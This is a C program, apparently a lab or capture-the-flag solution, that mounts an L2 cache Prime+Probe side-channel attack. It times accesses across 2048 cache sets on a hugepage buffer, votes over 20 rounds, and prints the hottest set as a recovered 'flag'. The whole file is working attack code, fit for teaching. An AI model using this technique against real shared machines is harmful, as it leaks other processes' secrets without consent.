#include "util.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <unistd.h>

#define PAGE_SIZE (2 * 1024 * 1024) // 2MB Hugepage
#define L2_CACHE_SETS 2048          // Number of L2 cache sets
#define SAMPLE_RUNS 30              // Number of samples per set
#define ADDRESSES_PER_SET 8         // Addresses to probe per set
#define ROUNDS 20                   // Number of rounds for stable voting

// Probe a cache set and get average access time
uint64_t probe_set(volatile uint8_t *buf, int set_index) {
    uint64_t total_time = 0;

    for (int i = 0; i < SAMPLE_RUNS; i++) {
        for (int j = 0; j < ADDRESSES_PER_SET; j++) {
            volatile uint8_t *addr = buf + (set_index * 64) + (j * 4096);
            total_time += measure_one_block_access_time((uint64_t)addr);
        }
    }
    return total_time / (SAMPLE_RUNS * ADDRESSES_PER_SET);
}

int main(int argc, char const *argv[]) {
    int flag = -1;

    volatile uint8_t *buf = (volatile uint8_t *) mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);

    if (buf == MAP_FAILED) {
        perror("mmap error");
        exit(1);
    }

    buf[0] = 1; // dummy write

    printf("Attacker started. Monitoring cache sets...\n");

    int votes[L2_CACHE_SETS] = {0};

    // Multiple rounds
    for (int round = 0; round < ROUNDS; round++) {
        uint64_t timings[L2_CACHE_SETS];

        for (int set = 0; set < L2_CACHE_SETS; set++) {
            timings[set] = probe_set(buf, set);
        }

        uint64_t max_time = 0;
        int candidate_flag = -1;

        for (int set = 0; set < L2_CACHE_SETS; set++) {
            if (timings[set] > max_time) {
                max_time = timings[set];
                candidate_flag = set;
            }
        }

        if (candidate_flag != -1) {
            votes[candidate_flag]++;
        }

        usleep(500); // short pause
    }

    // Find the set with the most votes
    int max_votes = 0;
    for (int set = 0; set < L2_CACHE_SETS; set++) {
        if (votes[set] > max_votes) {
            max_votes = votes[set];
            flag = set;
        }
    }

    printf("Flag: %d\n", flag);
    return 0;
}
